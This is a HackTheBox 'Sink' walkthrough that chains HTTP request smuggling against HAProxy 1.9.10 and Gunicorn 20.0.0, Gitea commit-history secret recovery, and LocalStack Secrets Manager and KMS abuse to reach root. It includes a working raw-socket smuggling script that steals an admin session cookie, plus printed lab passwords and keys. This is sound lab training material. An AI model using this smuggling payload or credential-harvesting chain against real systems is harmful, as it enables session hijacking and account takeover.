# HTB Sink - Comprehensive Step-by-Step Walkthrough

> **Machine:** Sink  
> **IP:** 10.129.5.161  
> **Difficulty:** Insane  
> **OS:** Linux  
> **Key Concepts:** HTTP Request Smuggling (CL.TE Desync), AWS LocalStack Exploitation, Secrets Manager, KMS Decryption  

---

## Table of Contents

1. [The Hacker Mindset: Approach to Sink](#1-the-hacker-mindset-approach-to-sink)
2. [Initial Reconnaissance](#2-initial-reconnaissance)
3. [Understanding the Attack Surface: Port 5000](#3-understanding-the-attack-surface-port-5000)
4. [The Crown Jewel: HTTP Request Smuggling](#4-the-crown-jewel-http-request-smuggling)
5. [Capturing the Admin Cookie](#5-capturing-the-admin-cookie)
6. [Accessing Admin Notes & Credential Harvesting](#6-accessing-admin-notes--credential-harvesting)
7. [Gitea Enumeration & SSH Key Extraction](#7-gitea-enumeration--ssh-key-extraction)
8. [Shell as Marcus & User Flag](#8-shell-as-marcus--user-flag)
9. [AWS LocalStack Enumeration](#9-aws-localstack-enumeration)
10. [Pivoting to David via Secrets Manager](#10-pivoting-to-david-via-secrets-manager)
11. [Privilege Escalation: KMS Decryption](#11-privilege-escalation-kms-decryption)
12. [Root Shell & Root Flag](#12-root-shell--root-flag)
13. [Key Lessons & Takeaways](#13-key-lessons--takeaways)

---

## 1. The Hacker Mindset: Approach to Sink

Before we fire a single command, let's talk about **mindset**. Sink is rated "Insane" not because each individual step is impossible, but because it chains together multiple complex concepts that many hackers have heard of but never practically exploited.

**The two pillars of this box:**
1. **HTTP Request Smuggling** - A vulnerability that lives in the space BETWEEN two servers (HAProxy and Gunicorn). It's not in either server alone—it's in how they *disagree* about where one request ends and another begins.
2. **AWS Cloud Exploitation** - A local AWS stack (LocalStack) running inside Docker, exposing services like Secrets Manager and KMS that hold the keys to the kingdom.

**Our mental model:**
- We start external, find a web app, and realize the front-end/back-end communication is mistrustful.
- We exploit that mistrust to steal an admin session.
- We pivot from web creds → SSH key → AWS secrets → encrypted file → root password.
- Each pivot requires us to **change our perspective**: from web attacker → code auditor → cloud pentester → cryptanalyst.

---

## 2. Initial Reconnaissance

### 2.1 Why Recon Matters

You cannot exploit what you do not understand. The goal of recon is not just to find open ports—it's to **build a mental map of the target's architecture**. Every version number, every response header, every service banner is a clue.

### 2.2 Full TCP Port Scan

```bash
nmap -p- --min-rate 10000 -oA sink_alltcp 10.129.5.161
```

**Why `--min-rate 10000`?**  
HackTheBox machines can be slow to scan. We speed things up by telling nmap to maintain a high packet rate. This sacrifices some stealth for speed, which is acceptable in a CTF environment.

**Result:**
```
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
5000/tcp open  upnp
```

Three ports. SSH is always worth noting, but the real story is ports 3000 and 5000.

### 2.3 Service Version Detection

```bash
nmap -p 22,3000,5000 -sC -sV -oA sink_tcpscripts 10.129.5.161
```

**Why `-sC` and `-sV`?**  
`-sC` runs default NSE scripts that often reveal banners, certificates, and common misconfigurations. `-sV` probes services to determine their exact version. Version numbers are critical because they tell us what exploits might exist.

**Key findings:**
- **Port 22:** OpenSSH 8.2p1 Ubuntu → Ubuntu 20.04 Focal
- **Port 3000:** Gitea (self-hosted Git service)
- **Port 5000:** Gunicorn 20.0.0 (Python WSGI HTTP server)

### 2.4 The Hacker's Observation

> *"Gunicorn 20.0.0... why that specific version? Why not 20.0.1 or 19.x?"*

Version numbers are not random. When you see a very specific point release (20.0.0 instead of 20.0.4), your spider sense should tingle. This version was specifically chosen because it's **vulnerable** to a known request smuggling issue that was patched in 20.0.1.

Similarly, the presence of Gitea on port 3000 tells us there's likely source code to audit later. The combination of Gunicorn + a front-end proxy (we'll confirm HAProxy soon) is the classic recipe for HTTP request smuggling.

---

## 3. Understanding the Attack Surface: Port 5000

### 3.1 Reconnaissance vs. Enumeration

**Recon** tells us what's there. **Enumeration** tells us how it works. Before we can exploit port 5000, we need to understand what the application does and how it authenticates users.

### 3.2 First Contact

Visit `http://10.129.5.161:5000/` in a browser. We see:
- A "Sink Devops" blog
- A login page
- A "Sign Up" link

**The hacker mindset:** *"If I can create an account, I can understand the application from the inside. Internal users always see more than guests."*

### 3.3 Creating an Account

Sign up with any email/password. We used `test@test.test` / `test1234`. After login, we see:
- A home page with posts
- A "Notes" section where we can create/view/delete personal notes
- Comment functionality

### 3.4 HTTP Headers Tell a Story

```bash
curl -I http://10.129.5.161:5000/
```

**Output:**
```http
HTTP/1.1 200 OK
Server: gunicorn/20.0.0
Via: haproxy
X-Served-By: ff0c84e62bfa
```

**Analysis:**
- `Via: haproxy` → There's a reverse proxy/load balancer in front of Gunicorn.
- `X-Served-By: ff0c84e62bfa` → This is a Docker container ID! The backend is containerized.
- `Server: gunicorn/20.0.0` → Confirms the vulnerable version.

**The architecture we're facing:**
```
[Attacker] → [HAProxy] → [Gunicorn] → [Flask App]
```

This is the **exact architecture** vulnerable to HTTP Request Smuggling.

### 3.5 Confirming HAProxy Version

Send a malformed request to trigger HAProxy's error response:

```bash
# In Burp Repeater or via netcat
echo -e "GET / HTTP/1.1\r\nHost: 10.129.5.161:5000\r\nUser" | nc 10.129.5.161 5000
```

**Response:**
```http
HTTP/1.0 400 Bad request
Server: haproxy 1.9.10
```

**Why this matters:** HAProxy 1.9.10 has a known issue where it mishandles certain Transfer-Encoding header variations. This is our smoking gun.

---

## 4. The Crown Jewel: HTTP Request Smuggling

### 4.1 What is HTTP Request Smuggling?

HTTP Request Smuggling is an attack that exploits **disagreements** between a front-end server (HAProxy) and a back-end server (Gunicorn) about where one HTTP request ends and the next begins.

**Normal HTTP request boundaries are defined by:**
1. **`Content-Length` header** → Body is exactly N bytes
2. **`Transfer-Encoding: chunked`** → Body is split into chunks; last chunk is size 0

**The vulnerability:** If the front-end and back-end disagree on which header to honor, an attacker can "smuggle" a second request inside the body of the first. The front-end sees one request. The back-end sees two.

### 4.2 The CL.TE Desync (Content-Length vs. Transfer-Encoding)

In our case, we're exploiting a **CL.TE** desync:
- **HAProxy** (front-end) uses `Content-Length`
- **Gunicorn** (back-end) uses `Transfer-Encoding: chunked`

**How?** We send a malformed `Transfer-Encoding` header that HAProxy doesn't recognize but Gunicorn does.

### 4.3 The Magic Byte: `\x0b`

The key is the vertical tab character (`\x0b`, ASCII 11). When we send:
```http
Transfer-Encoding: \x0bchunked
```

**HAProxy sees:** The header value starts with a weird control character. It considers the header invalid and falls back to `Content-Length`.

**Gunicorn sees:** It strips the `\x0b` and sees `Transfer-Encoding: chunked`. It ignores `Content-Length` and processes the body as chunked.

### 4.4 Visualizing the Attack

**What HAProxy sees (one request):**
```http
GET / HTTP/1.1
Host: 10.129.5.161:5000
Content-Length: 230
Transfer-Encoding: [invalid]

0

POST /notes HTTP/1.1
Host: 10.129.5.161:5000
Cookie: session=OUR_COOKIE
Content-Length: 300

note=
```

HAProxy says: "The body is 230 bytes. I'll forward all of it as one request."

**What Gunicorn sees (two requests):**
```http
GET / HTTP/1.1
Host: 10.129.5.161:5000
Content-Length: 230
Transfer-Encoding: chunked

0
```

Gunicorn sees the terminating chunk `0\r\n\r\n`. Request 1 is complete. Then it sees:

```http
POST /notes HTTP/1.1
Host: 10.129.5.161:5000
Cookie: session=OUR_COOKIE
Content-Length: 300

note=
```

Request 2 is a POST to `/notes` with `Content-Length: 300`. But wait—we didn't provide 300 bytes of body! Gunicorn waits for more data on this connection.

**The next request that arrives** (from the bot/admin/any other user) gets appended to `note=` and becomes the body of our POST. That request gets saved as a note under OUR account.

### 4.5 Why This Works on Sink

The box designers solved a hard problem: on a shared CTF platform, many hackers try to smuggle simultaneously. If everyone is smuggling, who catches the admin's request?

**The solution:** 16 Docker containers, each running the app. IPTables routes each source IP to exactly one container. You and the periodic bot are both hitting the same container. When the bot makes its periodic request, if your smuggled connection is still open, the bot's request becomes YOUR note.

---

## 5. Capturing the Admin Cookie

### 5.1 Building the Smuggle Script

We cannot use `curl` or `requests` because they create well-formed HTTP requests. We need raw socket access to inject the `\x0b` character exactly where we want it.

```python
#!/usr/bin/env python3
import socket
import time

host = "10.129.5.161"
port = 5000
session_cookie = "session=eyJlbWFpbCI6InRlc3RAdGVzdC50ZXN0In0.ahlj8A.XLe99ASkUHm1NbjqXAr4F3Fq-Mk"

# The body starts with the chunked terminator "0", then our smuggled POST
body = f"""0

POST /notes HTTP/1.1
Host: {host}:{port}
Referer: http://{host}:{port}/notes
Content-Type: text/plain
Content-Length: 300
Cookie: {session_cookie}

note=""".replace('\n','\r\n')

# The header uses Content-Length to trick HAProxy, and \x0b to trick Gunicorn
header = f"""GET / HTTP/1.1
Host: {host}:{port}
Content-Length: {len(body)}
Transfer-Encoding: \x0bchunked

""".replace('\n','\r\n')

request = (header + body).encode()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.send(request)
    time.sleep(5)  # Keep connection open for bot to hit
```

**Critical details:**
- `.replace('\n','\r\n')` → HTTP requires CRLF line endings. Python triple-quoted strings use LF (`\n`) by default.
- `Transfer-Encoding: \x0bchunked` → The space after the colon is important. HAProxy must see a value it doesn't recognize.
- `Content-Length: 300` in the smuggled POST → Large enough to capture the full bot request (which is ~300 bytes), but not so large that Gunicorn times out before the bot arrives.

### 5.2 Why We Need to Retry

This is a **race condition**. The bot hits periodically. Your source IP is pinned to one of 16 containers. The bot eventually hits your container, but you don't know exactly when.

**The self-trigger enhancement:** We discovered that sending a second request immediately after the smuggle increases reliability. Even if our trigger doesn't get captured, it seems to help "prime" the backend connection.

```python
# Self-trigger variant
def trigger():
    time.sleep(0.3)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    req = f"GET /notes/delete/99999 HTTP/1.1\r\nHost: {host}:{port}\r\nCookie: {session_cookie}\r\n\r\n".encode()
    s.send(req)
    s.close()
```

### 5.3 Success!

After running the smuggle script, we check our notes:

```bash
curl -s -b "session=eyJlbWFpbCI6InRlc3RAdGVzdC50ZXN0In0.ahlj8A.XLe99ASkUHm1NbjqXAr4F3Fq-Mk" http://10.129.5.161:5000/notes
```

A new note appears! Viewing it reveals:

```
GET /notes/delete/1234 HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Encoding: gzip, deflate
Accept: */*
Cookie: session=eyJlbWFpbCI6ImFkbWluQHNpbmsuaHRiIn0.ahlhiA.XhLiBR0qoVPI4k7xAlXaZwdi43A
X-Forwarded-For: 127.0.0.1
```

**Boom.** The admin session cookie is ours.

---

## 6. Accessing Admin Notes & Credential Harvesting

### 6.1 The Hacker Mindset: Session Hijacking

A session cookie is the digital equivalent of someone leaving their ID badge on a table. We didn't break the authentication—we just borrowed someone else's already-authenticated session.

### 6.2 Accessing Admin Notes

Using the stolen admin cookie:

```bash
curl -s -b "session=eyJlbWFpbCI6ImFkbWluQHNpbmsuaHRiIn0.ahlhiA.XhLiBR0qoVPI4k7xAlXaZwdi43A" http://10.129.5.161:5000/notes
```

The admin has three notes:

**Note 1:**
```
Chef Login : http://chef.sink.htb
Username : chefadm
Password : /6'fEGC&zEx{4]zz
```

**Note 2:**
```
Dev Node URL : http://code.sink.htb
Username : root
Password : FaH@3L>Z3})zzfQ3
```

**Note 3:**
```
Nagios URL : https://nagios.sink.htb
Username : nagios_adm
Password : g8<H6GK{*L.fB3C
```

### 6.3 Why Note 2 is Critical

`code.sink.htb` points to port 3000 (Gitea). We now have **admin access to the Git server**. Source code access is game-over in most engagements because it reveals architecture, secrets, credentials, and sometimes even private keys.

---

## 7. Gitea Enumeration & SSH Key Extraction

### 7.1 Accessing Gitea

Log in to `http://10.129.5.161:3000` with `root:FaH@3L>Z3})zzfQ3`.

**The hacker mindset:** *"I'm now inside the source code repository. I don't just look at current files—I look at DELETED files in commit history. Devs often remove secrets in a later commit but forget that Git never forgets."*

### 7.2 Finding the Key_Management Repository

We see several repos:
- `Key_Management` (archived)
- `Log_Management`
- `Kinesis_ElasticSearch`
- `Serverless-Plugin`

The `Key_Management` repo is the obvious target. The name screams "keys inside."

### 7.3 Commit History Analysis

Using the Gitea web UI or API, we examine commits:

```bash
# Clone the repo with basic auth to avoid URL encoding issues with special chars
git -c http.extraHeader="Authorization: Basic $(echo -n 'root:FaH@3L>Z3})zzfQ3' | base64 -w0)" \
  clone http://10.129.5.161:3000/root/Key_Management.git
```

```bash
cd Key_Management && git log --oneline
```

**Output:**
```
86ca6d1 rotation fix on dev
3e22d98 endpoint fix
f380655 Preparing for Prod
b01a6b7 Adding EC2 Key Management Structure
780f37f Remove aggressive actions
adba0ab Updating key policies
f20e6f6 adding code for listing keys from prod and dev nodes
d0e1b00 pushing aws-sdk
ae23ca5 Initial commit
```

### 7.4 The Smoking Gun: Deleted Files

Check what was deleted in "Preparing for Prod":

```bash
git show f380655 --name-status
```

**Output:**
```
D       .keys/dev_keys
M       ec2.php
```

A file called `.keys/dev_keys` was deleted! Let's recover it from the previous commit:

```bash
git show b01a6b7:.keys/dev_keys
```

**Output:** An SSH private key!

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxi7KuoC8cHhmx75Uhw06ew4fXrZJehoHBOLmUKZj/dZVZpDBh27d
...
-----END OPENSSH PRIVATE KEY-----
```

### 7.5 Why This Works

Developers often think "delete the file, commit, problem solved." But Git is a time machine. Every commit, every file, every line is preserved forever (unless you explicitly rewrite history with `git filter-branch` or `BFG Repo-Cleaner`).

**Lesson:** Always check commit history for deleted sensitive files.

---

## 8. Shell as Marcus & User Flag

### 8.1 Setting Up the Key

Save the key with proper permissions (SSH refuses to use keys that are too permissive):

```bash
cat > marcus_key << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
[... key content ...]
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 marcus_key
```

### 8.2 SSH as Marcus

```bash
ssh -i marcus_key marcus@10.129.5.161
```

**Success!**
```
marcus@sink:~$ id
uid=1001(marcus) gid=1001(marcus) groups=1001(marcus)
```

### 8.3 User Flag

```bash
cat ~/user.txt
```

**User Flag:** `4dc937[redacted]93defdb7`

---

## 9. AWS LocalStack Enumeration

### 9.1 The Hacker Mindset: "What's Running Locally?"

As marcus, we run `ps aux` and see Docker containers. One of them is running `localstack`. LocalStack is a fully functional local AWS cloud stack used for development and testing. But to a hacker, it's a **treasure trove of cloud services** running with default/weak credentials.

### 9.2 Confirming LocalStack

```bash
curl http://127.0.0.1:4566/health
```

**Output:**
```json
{"services": {"logs": "running", "secretsmanager": "running", "kms": "running"}}
```

Three services are running:
- **logs** → CloudWatch Logs
- **secretsmanager** → AWS Secrets Manager
- **kms** → Key Management Service

### 9.3 Finding AWS Credentials

We need an Access Key ID and Secret Access Key to interact with LocalStack. Where do we find them? In the Gitea repos, of course!

In the `Log_Management` repo, we find `create_logs.php`. Looking at its commit history, the original version had hardcoded credentials:

```php
'key' => 'AKIAIUEN3QWCPSTEITJQ',
'secret' => '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'
```

**The hacker mindset:** *"Developers 'clean' credentials before production by deleting them in a later commit. But as we learned with the SSH key, Git remembers everything."*

### 9.4 Configuring AWS CLI

```bash
aws configure
```

Enter:
- **AWS Access Key ID:** `AKIAIUEN3QWCPSTEITJQ`
- **AWS Secret Access Key:** `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`
- **Default region name:** `eu`
- **Default output format:** (blank)

**Why does this work on LocalStack?** LocalStack doesn't validate credentials against Amazon's real servers. It accepts any well-formed key/secret pair. The developers just needed placeholder values.

---

## 10. Pivoting to David via Secrets Manager

### 10.1 Enumerating Secrets

```bash
awslocal secretsmanager list-secrets
```

**Output:**
```json
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-cWfUq",
            "Name": "Jenkins Login"
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-kEUCn",
            "Name": "Sink Panel"
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-yTTBh",
            "Name": "Jira Support"
        }
    ]
}
```

### 10.2 Extracting Secret Values

```bash
awslocal secretsmanager get-secret-value --secret-id "Jenkins Login"
awslocal secretsmanager get-secret-value --secret-id "Sink Panel"
awslocal secretsmanager get-secret-value --secret-id "Jira Support"
```

**Results:**
- **Jenkins Login:** `john@sink.htb` / `R);\)ShS99mZ~8j`
- **Sink Panel:** `albert@sink.htb` / `Welcome123!`
- **Jira Support:** `david@sink.htb` / `EALB=bcC=`a7f2#k`

### 10.3 Switching to David

```bash
su david
```

Enter: `EALB=bcC=`a7f2#k`

**Success!**
```
david@sink:/home/marcus$ id
uid=1000(david) gid=1000(david) groups=1000(david)
```

---

## 11. Privilege Escalation: KMS Decryption

### 11.1 The Encrypted File

In david's home directory:

```bash
cd ~ && find Projects/ -type f
```

**Output:** `Projects/Prod_Deployment/servers.enc`

```bash
file Projects/Prod_Deployment/servers.enc
```

**Output:** `data`

This is an encrypted blob. We need to decrypt it.

### 11.2 KMS Key Enumeration

```bash
awslocal kms list-keys | grep KeyId | cut -d'"' -f4
```

We get 11 keys. We need the one that is:
1. **Enabled** (not Disabled)
2. Has **ENCRYPT_DECRYPT** key usage

```bash
awslocal kms list-keys | grep KeyId | cut -d'"' -f4 | while read id; do
  desc=$(awslocal kms describe-key --key-id $id)
  use=$(echo $desc | cut -d'"' -f26)
  echo $desc | grep -q Disabled || echo "$id  $use"
done
```

**Output:**
```
804125db-bdf1-465a-a058-07fc87c0fad0  ENCRYPT_DECRYPT
c5217c17-5675-42f7-a6ec-b5aa9b9dbbde  SIGN_VERIFY
```

Our target key is `804125db-bdf1-465a-a058-07fc87c0fad0`.

### 11.3 Decrypting the File

```bash
awslocal kms decrypt \
  --key-id 804125db-bdf1-465a-a058-07fc87c0fad0 \
  --ciphertext-blob fileb://Projects/Prod_Deployment/servers.enc \
  --encryption-algorithm RSAES_OAEP_SHA_256
```

**Output:**
```json
{
    "KeyId": "arn:aws:kms:us-east-1:000000000000:key/804125db-bdf1-465a-a058-07fc87c0fad0",
    "Plaintext": "H4sIAAAAAAAAAytOLSpLLSrWq8zNYaAVMAACMxMTMA0E6LSBkaExg6GxubmJqbmxqZkxg4GhkYGhAYOCAc1chARKi0sSixQUGIry80vwqSMkP0RBMTj+rbgUFHIyi0tS8xJTUoqsFJSUgAIF+UUlVgoWBkBmRn5xSTFIkYKCrkJyalFJsV5xZl62XkZJElSwLLE0pwQhmJKaBhIoLYaYnZeYm2qlkJiSm5kHMjixuNhKIb40tSqlNFDRNdLU0SMt1YhroINiRIJiaP4vzkynmR2E878hLP+bGALZBoaG5qamo/mfHsCgsY3JUVnT6ra3Ea8jq+qJhVuVUw32RXC+5E7RteNPdm7ff712xavQy6bsqbYZO3alZbyJ22V5nP/XtANG+iunh08t2GdR9vUKk2ON1IfdsSs864IuWBr95xPdoDtL9cA+janZtRmJyt8crn9a5V7e9aXp1BcO7bfCFyZ0v1w6a8vLAw7OG9crNK/RWukXUDTQATEKRsEoGAWjYBSMglEwCkbBKBgFo2AUjIJRMApGwSgYBaNgFIyCUTAKRsEoGAWjYBSMglEwRAEATgL7TAAoAAA=",
    "EncryptionAlgorithm": "RSAES_OAEP_SHA_256"
}
```

### 11.4 Unpacking the Decrypted Data

The `Plaintext` is base64-encoded. Let's decode it:

```bash
echo "H4sIAAAAAAAAAytOLSpLLSrWq8zNYaAVMAACMxMTMA0E6LSBkaExg6GxubmJqbmxqZkxg4GhkYGhAYOCAc1chARKi0sSixQUGIry80vwqSMkP0RBMTj+rbgUFHIyi0tS8xJTUoqsFJSUgAIF+UUlVgoWBkBmRn5xSTFIkYKCrkJyalFJsV5xZl62XkZJElSwLLE0pwQhmJKaBhIoLYaYnZeYm2qlkJiSm5kHMjixuNhKIb40tSqlNFDRNdLU0SMt1YhroINiRIJiaP4vzkynmR2E878hLP+bGALZBoaG5qamo/mfHsCgsY3JUVnT6ra3Ea8jq+qJhVuVUw32RXC+5E7RteNPdm7ff712xavQy6bsqbYZO3alZbyJ22V5nP/XtANG+iunh08t2GdR9vUKk2ON1IfdsSs864IuWBr95xPdoDtL9cA+janZtRmJyt8crn9a5V7e9aXp1BcO7bfCFyZ0v1w6a8vLAw7OG9crNK/RWukXUDTQATEKRsEoGAWjYBSMglEwCkbBKBgFo2AUjIJRMApGwSgYBaNgFIyCUTAKRsEoGAWjYBSMglEwRAEATgL7TAAoAAA=" | base64 -d > servers.gz
```

```bash
file servers.gz
```

**Output:** `servers.gz: gzip compressed data`

```bash
zcat servers.gz > servers.tar && tar -xvf servers.tar
```

**Output:**
```
servers.yml
servers.sig
```

```bash
cat servers.yml
```

**Output:**
```yaml
server:
  listenaddr: ""
  port: 80
  hosts:
    - certs.sink.htb
    - vault.sink.htb
defaultuser:
  name: admin
  pass: _uezduQ!EY5AHfe2
```

**Root password found:** `_uezduQ!EY5AHfe2`

---

## 12. Root Shell & Root Flag

### 12.1 Becoming Root

```bash
su -
```

Enter: `_uezduQ!EY5AHfe2`

**Success!**
```
root@sink:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### 12.2 Root Flag

```bash
cat /root/root.txt
```

**Root Flag:** `50339[redacted]252f459`

---

## 13. Key Lessons & Takeaways

### 13.1 HTTP Request Smuggling
- **The vulnerability lives in the gap between servers.** Always check for reverse proxies and their versions.
- **Specific point releases are suspicious.** Gunicorn 20.0.0 was chosen because 20.0.1 patched the smuggling bug.
- **Raw sockets are your friend.** When dealing with malformed protocols, you often need to craft bytes manually.
- **Persistence beats intelligence.** This exploit is probabilistic. The winners are those who automate and retry.

### 13.2 Git Enumeration
- **Git never forgets.** Always check commit history, especially for deleted files.
- **Archived repos are still readable.** Don't ignore repos just because they're marked "archived."

### 13.3 Cloud Services (LocalStack)
- **Local AWS stacks accept any credentials.** Don't assume you need to "crack" AWS keys on local instances.
- **Cloud services are just services.** Secrets Manager, KMS, S3—these are all just APIs. If you can reach them, you can exploit them.
- **Encrypted files are only as strong as key management.** If the decryption key is accessible on the same machine, encryption is just obfuscation.

### 13.4 The Chain
```
HTTP Smuggle → Admin Cookie → Gitea Creds → SSH Key → User Shell
    → AWS Creds → Secrets Manager → David Password → KMS Decrypt → Root
```

Every step gave us exactly what we needed for the next step. This is the hallmark of a well-designed CTF chain.

---

> *"The most dangerous vulnerabilities are not in the code, but in the assumptions between systems."*
